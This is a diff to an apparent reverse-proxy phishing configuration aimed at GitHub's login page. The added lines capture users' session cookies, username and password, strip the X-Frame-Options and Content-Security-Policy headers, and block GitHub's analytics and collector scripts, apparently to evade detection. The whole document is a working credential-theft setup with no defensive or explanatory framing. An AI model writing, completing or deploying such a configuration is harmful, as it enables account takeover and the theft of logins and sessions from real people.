@@ -6,15 +6,20 @@ proxy_hosts:
     target: "github.com"
 auth_urls: ["/login"]
 landing_path: ["/login"]
-auth_tokens: []
-credentials: []
+auth_tokens:
+  - {type: "cookie", name: "user_session"}
+  - {type: "cookie", name: "__Host-user_session_same_site"}
+credentials:
+  - {type: "post_param", name: "login", regex: null}
+  - {type: "post_param", name: "password", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
 path_rewrites:
   - {pattern: "^/$", replace: "/login", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/assets/", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/assets/|/collector", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"session\"]", action_to: "/session"}
